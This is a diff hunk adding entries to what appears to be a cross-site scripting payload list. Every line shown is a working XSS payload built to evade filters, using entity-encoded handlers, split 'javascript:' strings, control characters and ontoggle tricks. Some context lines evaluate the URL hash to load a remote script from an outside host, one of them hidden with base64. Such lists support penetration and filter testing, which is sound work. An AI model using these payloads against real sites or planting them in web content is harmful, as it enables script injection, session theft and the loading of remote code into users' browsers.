@@ -11,6 +11,10 @@ abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3
 <script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>
 jaVasCript:/--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(1)//'>"'alert(1)
 <img/src/onerror​=alert&#xFEFF;(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
+<svg<0x0c>onload=alert(1)><svg>
+'><details/open/ontoggle=confirm(document.location)>
 <svg/onload=eval(location.hash.slice(1))>#with(document)body.appendChild(createElement('script')).src='//js.rip/bugbounty'
 <svg/onload=eval(location.hash.slice(1))>#with(document)body.appendChild(createElement(/script/.source)).src=atob(/Ly9qcy5yaXAvYnVnYm91bnR5/.source)
 <svg/onload=eval(atob(location.hash.slice(1)))>#d2l0aChkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnQoL3NjcmlwdC8uc291cmNlKSkuc3JjPWF0b2IoL0x5OXFjeTV5YVhBdlluVm5ZbTkxYm5SNS8uc291cmNlKQ==
